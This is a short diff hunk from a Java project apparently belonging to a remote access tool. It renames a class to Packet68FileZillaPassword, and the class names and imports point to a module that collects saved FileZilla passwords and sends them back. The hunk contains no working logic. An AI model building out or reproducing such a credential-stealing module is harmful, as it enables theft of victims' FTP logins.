@@ -16,7 +16,7 @@ import com.redpois0n.stub.packets.outgoing.Packet48FileZillaPassword;
 import com.redpois0n.utils.Utils;
 
 
-public class PacketFZ extends AbstractIncomingPacket {
+public class Packet68FileZillaPassword extends AbstractIncomingPacket {
 
 	@Override
 	public void read() throws Exception {
